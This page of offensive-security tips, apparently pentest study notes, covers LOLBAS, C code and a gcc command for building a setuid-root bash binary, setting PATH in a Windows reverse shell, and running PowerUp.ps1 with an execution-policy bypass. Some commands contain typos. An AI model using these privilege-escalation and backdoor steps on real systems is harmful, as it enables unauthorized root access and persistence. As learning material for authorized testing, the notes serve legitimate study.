---
icon: lightbulb-gear
---

# Tips and Tricks

### LOLBAS (Living Off the Land Binaries) <a href="#compile-suid-bash" id="compile-suid-bash"></a>

technique that is based on taking advantage of the system’s own binaries to cause significant damage in an attack, with a relatively low detection rate.

{% embed url="https://lolbas-project.github.io/" %}

### Compile SUID bash <a href="#compile-suid-bash" id="compile-suid-bash"></a>

If you find you can run command as root, you could compile a setuid bash for you! First create a `c` program:

```
int main(void)
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

Compile (for x64):

```
gcc setuid.c -o <outputfile>
```

### Set ENV in windows

In case Windows reverse shell throw error for basic command lke whoami and all, they this

```sql
set PATH=%SystemRoot%\\system32;%SystemRoot%;
```

### Fixing Frozen PowerShell

{% hint style="success" %}
May face this issue where you get cmd.exe shell and when you run powershell.exe, the shell frozes. 😟
{% endhint %}

#### Wayaround to run powerUp.ps1

```bash
# at the end of the line, add the following command
Invoke-AllChecks

# On your cmd shell, run powerup like this
powershell -ep byppass .\powerUp.ps1

# Bomm! mo frozen shell but results!!
```
